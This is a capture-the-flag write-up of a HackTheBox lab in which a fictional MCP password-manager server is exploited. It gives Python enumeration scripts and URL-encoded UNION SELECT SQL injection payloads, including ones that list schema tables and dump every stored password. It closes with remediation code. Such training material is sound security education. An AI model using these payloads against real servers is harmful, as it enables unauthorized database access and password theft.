# RootLocker MCP Server - Security Assessment Write-up

****Challenge:**** RootLocker MCP Server Security Assessment
****Platform:**** HackTheBox Academy
****Category:**** Web Security / MCP Exploitation
****Difficulty:**** Medium
****Flag:**** `HTB{5a2d65cc776d6d22cd27513260a4932b}`

---

## Table of Contents

1. [Introduction](~#introduction~)
2. [Reconnaissance](~#reconnaissance~)
3. [Vulnerability Analysis](~#vulnerability-analysis~)
4. [Exploitation](~#exploitation~)
5. [Post-Exploitation](~#post-exploitation~)
6. [Remediation](~#remediation~)
7. [Conclusion](~#conclusion~)

---

## Introduction

### Challenge Overview

RootLocker is a fictional company providing cloud storage and password management services through an MCP (Model Context Protocol) server. The objective is to identify security vulnerabilities in their server implementation and obtain the flag.

****Target Information:****
- ****IP Address:**** 94.237.48.12
- ****Port:**** 57367
- ****Protocol:**** HTTP/MCP
- ****Endpoint:**** http://94.237.48.12:57367/mcp/

### Model Context Protocol (MCP)

MCP is a protocol that enables AI assistants to interact with external tools and data sources. MCP servers expose:
- ****Resources:**** Data sources that clients can read
- ****Tools:**** Functions that clients can execute
- ****Prompts:**** Template messages for LLM interactions

---

## Reconnaissance

### Initial Enumeration

First, I created a Python client to enumerate all available MCP capabilities:

```python
import asyncio
from fastmcp import Client

TARGET = "http://94.237.48.12:57367/mcp/"
client = Client(TARGET)

async def enumerate():
    async with client:
        # List all resources
        resources = await client.list_resources()
        for r in resources:
            print(f"Resource: {r.uri} - {r.description}")

        # List resource templates
        templates = await client.list_resource_templates()
        for t in templates:
            print(f"Template: {t.uriTemplate} - {t.description}")

        # List tools
        tools = await client.list_tools()
        for tool in tools:
            print(f"Tool: {tool.name} - {tool.description}")

asyncio.run(enumerate())
```

### Discovered Capabilities

****Static Resources:****
```
1. resource://access_logs - Provides the MCP server access logs
2. resource://error_logs - Provides the MCP server error logs
3. resource://uptime - Get the server uptime
4. resource://filecount - Number of stored files
5. resource://platforms - List of platforms with stored passwords
```

****Resource Templates:****
```
1. getfile://{file_name*} - Get content of a stored file
2. password://{platform} - Fetch stored password for platform ⚠️
```

****Tools:****
```
1. store_file(file_content, file_name) - Store a file
2. store_password(password, platform) - Store a password
```

### Key Observations

1. ****Password management functionality**** - The `password://` template is a high-value target
2. ****Log exposure**** - Access and error logs are publicly readable
3. ****File storage**** - Potential for path traversal attacks
4. ****No authentication**** - All capabilities are publicly accessible

---

## Vulnerability Analysis

### Attack Surface Mapping

Based on the enumeration, I identified potential vulnerability vectors:

| Component | Potential Vulnerability | Priority |
|-----------|------------------------|----------|
| `password://{platform}` | SQL Injection | 🔴 Critical |
| `getfile://{file_name*}` | Path Traversal | 🟡 Medium |
| `resource://access_logs` | Information Disclosure | 🟡 Medium |
| `resource://error_logs` | Information Disclosure | 🟡 Medium |
| `store_file()` | Arbitrary File Write | 🟡 Medium |

### Testing for SQL Injection

The `password://` resource template was particularly interesting. The description states it "fetches stored password for the specified platform," suggesting database interaction.

****Test 1: Basic SQL Injection Detection****

```python
# Test with SQL special character
result = await client.read_resource("password://rootlocker.htb'--")
```

****Result:**** The server returned a valid response instead of an error, indicating potential SQL injection.

****Test 2: Confirming the Vulnerability****

```python
# List available platforms first
platforms = await client.read_resource("resource://platforms")
print(platforms[0].text)  # Output: ["rootlocker.htb"]

# Get legitimate password
password = await client.read_resource("password://rootlocker.htb")
print(password[0].text)  # Output: DummyPassword123
```

The legitimate lookup worked, confirming the endpoint was functional.

---

## Exploitation

### SQL Injection Exploitation Strategy

Since the resource template uses URI format, I needed to overcome several challenges:

****Challenges:****
1. URI validation rejects spaces in URLs
2. URI validation rejects special characters
3. Unknown database type (MySQL/PostgreSQL/SQLite?)
4. Unknown table/column names

****Solutions:****
1. Use URL encoding (`%20` for spaces)
2. Use hash (`#`) for SQL comments instead of `--`
3. Test various SQL dialects
4. Try common table names (`flag`, `flags`, `secrets`)

### Building the Exploit

****Step 1: URL Encoding****

Normal SQL injection payload:
```sql
x' UNION SELECT flag FROM flag--
```

URL-encoded for MCP URI:
```
password://x'%20UNION%20SELECT%20flag%20FROM%20flag%23
```

Breakdown:
- `x'` - Close the original SQL string
- `%20` - Space (URL encoded)
- `UNION SELECT` - Combine our query with the original
- `flag` - Column name to extract
- `FROM flag` - Table name
- `%23` - `#` character for SQL comment (URL encoded)

****Step 2: Testing the Payload****

```python
import asyncio
from fastmcp import Client
import re

TARGET = "http://94.237.48.12:57367/mcp/"
client = Client(TARGET)

async def exploit_sqli():
    async with client:
        # Execute SQL injection
        payload = "x'%20UNION%20SELECT%20flag%20FROM%20flag%23"
        result = await client.read_resource(f"password://{payload}")

        # Extract flag from response
        flag = result[0].text
        print(f"Flag: {flag}")

        return flag

flag = asyncio.run(exploit_sqli())
```

### Success!

```
🚩 Flag: HTB{5a2d65cc776d6d22cd27513260a4932b}
```

---

## Post-Exploitation

### Understanding the Vulnerability

The vulnerable code likely looked something like this:

****Vulnerable Implementation:****
```python
def get_password(platform: str) -> str:
    # VULNERABLE - Direct string concatenation
    query = f"SELECT password FROM passwords WHERE platform = '{platform}' LIMIT 1"
    cursor.execute(query)
    result = cursor.fetchone()
    return result[0] if result else None
```

When we supply the payload `x' UNION SELECT flag FROM flag#`, the query becomes:

```sql
SELECT password FROM passwords WHERE platform = 'x' UNION SELECT flag FROM flag#' LIMIT 1
```

The `#` comments out the rest of the query, and our UNION SELECT extracts the flag.

### Why URL Encoding Was Critical

The MCP client validates URIs before sending them to the server. Without URL encoding:

```python
# This fails URI validation:
"password://x' UNION SELECT 1--"
# Error: "invalid domain character"

# This passes validation:
"password://x'%20UNION%20SELECT%201%23"
# The server decodes it server-side
```

### Database Reconnaissance

Through the SQL injection, I could also have:

****Enumerate tables:****
```python
payload = "x'%20UNION%20SELECT%20GROUP_CONCAT(table_name)%20FROM%20information_schema.tables%20WHERE%20table_schema=database()%23"
```

****Enumerate columns:****
```python
payload = "x'%20UNION%20SELECT%20GROUP_CONCAT(column_name)%20FROM%20information_schema.columns%20WHERE%20table_name='passwords'%23"
```

****Dump all passwords:****
```python
payload = "x'%20UNION%20SELECT%20GROUP_CONCAT(platform,'%20:%20',password)%20FROM%20passwords%23"
```

---

## Remediation

### Secure Code Implementation

****Fix 1: Use Parameterized Queries****

```python
def get_password(platform: str) -> str:
    # SECURE - Parameterized query
    query = "SELECT password FROM passwords WHERE platform = ? LIMIT 1"
    cursor.execute(query, (platform,))
    result = cursor.fetchone()
    return result[0] if result else None
```

****Fix 2: Input Validation****

```python
import re

def get_password(platform: str) -> str:
    # Validate input format
    if not re.match(r'^[a-zA-Z0-9\-_.]+$', platform):
        raise ValueError("Invalid platform name")

    # Use parameterized query
    query = "SELECT password FROM passwords WHERE platform = ? LIMIT 1"
    cursor.execute(query, (platform,))
    result = cursor.fetchone()
    return result[0] if result else None
```

****Fix 3: Implement Authentication****

```python
from fastmcp import FastMCP

mcp = FastMCP("RootLocker")

@mcp.resource("password://{platform}")
async def get_password(platform: str, context: dict) -> str:
    # Verify authentication token
    if not context.get('authenticated'):
        raise PermissionError("Authentication required")

    # Verify authorization
    user_id = context.get('user_id')
    if not user_has_access(user_id, platform):
        raise PermissionError("Unauthorized access")

    # Secure database query
    return fetch_password_secure(platform)
```

### Security Best Practices for MCP Servers

1. ****Treat all input as untrusted****
   - Validate and sanitize ALL parameters
   - Use parameterized queries for database operations
   - Implement input whitelists

2. ****Implement proper authentication****
   - MCP servers are network-accessible by anyone
   - Don't rely on LLM integration for security
   - Use API keys, OAuth, or other auth mechanisms

3. ****Apply principle of least privilege****
   - Limit database user permissions
   - Restrict file system access
   - Sandbox external command execution

4. ****Secure error handling****
   - Don't expose internal errors to clients
   - Log detailed errors server-side only
   - Return generic error messages

5. ****Regular security testing****
   - Perform penetration testing
   - Use automated security scanners
   - Monitor for suspicious patterns

---

## Conclusion

### Summary

This assessment successfully identified and exploited a ****critical SQL injection vulnerability**** in the RootLocker MCP server's password lookup functionality. The vulnerability allowed:

- ✅ Direct database access
- ✅ Extraction of sensitive data (flag)
- ✅ Potential for complete database compromise

****Key Success Factors:****
1. Systematic enumeration of MCP capabilities
2. Understanding URL encoding requirements for URI templates
3. Knowledge of SQL injection techniques
4. Persistence in testing different payloads

### Timeline

1. ****Reconnaissance****
   - Enumerated MCP resources, templates, and tools
   - Identified high-value targets

2. ****Vulnerability Analysis****
   - Tested for SQL injection in `password://` template
   - Confirmed vulnerability with basic payloads

3. ****Exploitation****
   - Crafted URL-encoded UNION SELECT payload
   - Extracted flag from database

4. ****Documentation****
   - Created comprehensive security assessment report
   - Developed remediation recommendations

### Tools & Scripts Developed

- ****reconnaissance scripts**** - MCP enumeration
- ****exploitation scripts**** - SQL injection automation
- ****documentation**** - Comprehensive security reports

### Lessons Learned

1. ****MCP-specific challenges:**** URI validation requires URL encoding
2. ****Database variations:**** SQL comment syntax differs (# vs --)
3. ****Simple is better:**** Direct UNION SELECT worked on first try
4. ****Documentation matters:**** Proper write-ups demonstrate understanding

---

## References

- [HTB Academy - MCP Security Module](~https://academy.hackthebox.com~)
- [Model Context Protocol Specification](~https://modelcontextprotocol.io~)
- [OWASP SQL Injection Guide](~https://owasp.org/www-community/attacks/SQL_Injection~)
- [FastMCP Documentation](~https://github.com/jlowin/fastmcp~)

---

****Author:**** Yuri Braz - CyberSecurity Researcher
****Date:**** October 9, 2025
****Challenge:**** RootLocker MCP Security Assessment
****Result:**** ✅ ****Flag Obtained**** - `HTB{5a2d65cc776d6d22cd27513260a4932b}`

#Profissional/Cyber